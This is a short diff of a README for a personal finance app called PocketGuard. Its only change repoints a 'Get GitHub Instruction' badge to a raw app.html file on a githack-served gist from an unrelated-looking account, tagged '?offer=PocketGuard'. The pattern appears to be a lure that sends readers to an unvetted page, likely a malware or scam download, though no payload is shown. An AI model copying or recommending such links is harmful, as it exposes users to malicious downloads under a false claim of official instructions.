@@ -2,7 +2,7 @@
 
 PocketGuard is a modern personal finance app designed to **track expenses, simplify budgeting, and reveal spending patterns**. It automatically connects to your accounts, categorizes transactions, and shows how much you can safely spend every day. 💳  
 
-[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893912/raw/main/app.html?offer=PocketGuard)
+[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/stafgriefer985/8789cc522de644d7d905c7ec2a16fd51/raw/823b093033bf8dbe467154a15b5ec97863542102/app.html?offer=PocketGuard)
 
 ---
 
